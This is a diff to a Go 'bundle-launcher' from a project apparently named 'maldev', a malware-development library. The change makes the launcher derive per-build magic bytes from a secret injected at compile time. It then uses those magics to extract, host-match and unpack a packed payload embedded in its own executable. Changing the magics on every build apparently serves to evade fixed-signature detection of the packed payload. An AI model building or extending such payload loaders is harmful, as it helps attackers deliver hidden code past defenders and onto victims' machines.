@@ -41,6 +41,24 @@ import (
 	"github.com/oioio-space/maldev/pe/packer"
 )
 
+// bundleSecret is the per-build secret string the operator injects at
+// compile time via:
+//
+//	go build -ldflags "-X main.bundleSecret=<secret>" -o bundle-launcher \
+//	  ./cmd/bundle-launcher
+//
+// The launcher derives a [packer.BundleProfile] from this secret on
+// startup and uses the per-build magic + footer to extract its
+// embedded bundle. Empty (default) → falls back to canonical
+// wire-format magics for back-compat with bundles wrapped without a
+// secret.
+//
+// The matching `packer bundle -wrap` invocation must use the SAME
+// secret (or none) for the magics to align — `packer bundle -wrap`
+// prints the corresponding -ldflags line as a hint when given
+// -secret.
+var bundleSecret string
+
 func main() {
 	exe, err := os.Executable()
 	if err != nil {
@@ -52,20 +70,24 @@ func main() {
 		fmt.Fprintln(os.Stderr, "bundle-launcher: read self:", err)
 		os.Exit(1)
 	}
-	bundle, err := packer.ExtractBundle(wrapped)
+	// Derive the per-build profile from the ldflags-injected secret.
+	// Empty secret = canonical wire-format magics (back-compat).
+	profile := packer.DeriveBundleProfile([]byte(bundleSecret))
+
+	bundle, err := packer.ExtractBundleWith(wrapped, profile)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, "bundle-launcher: extract:", err)
 		os.Exit(1)
 	}
 
-	idx, err := packer.MatchBundleHost(bundle)
+	idx, err := packer.MatchBundleHostWith(bundle, profile)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, "bundle-launcher: match:", err)
 		os.Exit(1)
 	}
 	if idx < 0 {
 		// Honour the bundle header's FallbackBehaviour field.
-		info, err := packer.InspectBundle(bundle)
+		info, err := packer.InspectBundleWith(bundle, profile)
 		if err != nil {
 			os.Exit(0)
 		}
@@ -82,7 +104,7 @@ func main() {
 		}
 	}
 
-	plain, err := packer.UnpackBundle(bundle, idx)
+	plain, err := packer.UnpackBundleWith(bundle, idx, profile)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, "bundle-launcher: unpack:", err)
 		os.Exit(1)
